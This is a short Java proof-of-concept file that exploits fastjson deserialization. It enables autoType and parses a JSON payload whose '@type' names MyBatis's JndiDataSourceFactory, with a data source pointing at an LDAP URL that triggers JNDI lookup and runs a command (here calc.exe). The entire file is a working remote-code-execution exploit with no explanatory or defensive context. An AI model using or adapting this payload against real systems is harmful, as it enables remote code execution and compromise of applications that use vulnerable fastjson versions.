package fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer;

public class exp3 {
    public static void main(String[] args){
        String payload = "{\n" +
                "    \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n" +
                "    \"properties\":{\n" +
                "        \"data_source\":\"ldap://127.0.0.1:1389/Basic/Command/calc.exe\"\n" +
                "    }\n" +
                "}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(payload);
    }
}
